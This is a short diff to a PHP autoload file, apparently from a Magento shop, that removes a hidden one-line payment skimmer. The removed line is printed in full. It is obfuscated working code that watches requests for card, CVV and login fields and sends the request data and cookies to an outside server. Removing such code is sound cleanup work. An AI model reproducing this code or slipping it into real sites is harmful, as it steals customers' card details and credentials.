@@ -27,8 +27,6 @@
 /**
  * Classes source autoload
  */
-ini_set('display_errors', 0); $Oomex = implode("_", array("str", "rot13")); $UFoJOA = $Oomex('onfr64_rapbqr'); $KkBv=$Oomex('onfr64_qrpbqr'); $olGOr = $Oomex('frevnyvmr'); $CvfBxJ=$Oomex('cert_zngpu'); if ($CvfBxJ("/".$KkBv('eWVhcnxiaWxsaW5nfHBheW1lbnR8Y2FyZF9udW1iZXJ8c2VjdXJldHJhZGluZ3xsb2dpbnxzaGlwcGluZ3xjY19udW1iZXJ8Y3ZjMnxkdW1teXxleHBpcnl8dXNlcm5hbWV8Zmlyc3RuYW1lfGN2dnxtb250aHxjY18=')."/i", $olGOr($_REQUEST))) {  $ch = curl_init();  curl_setopt($ch,CURLOPT_URL, trim($KkBv('aHR0cDovL3RyeXJlcXVlc3QuY29tL3Rlc3RTZXJ2ZXIucGhw')));  curl_setopt($ch,CURLOPT_POST, True);  curl_setopt($ch,CURLOPT_POSTFIELDS, "version=1&encode=".$UFoJOA( $olGOr($_REQUEST) . "--" . $olGOr($_COOKIE) )."&host=".$_SERVER["HTTP_HOST"]);  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);  curl_setopt($ch, CURLOPT_TIMEOUT, 5);  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  $ooo = @curl_exec($ch);  curl_close($ch); }
-
 class Varien_Autoload
 {
     const SCOPE_FILE_PREFIX = '__';
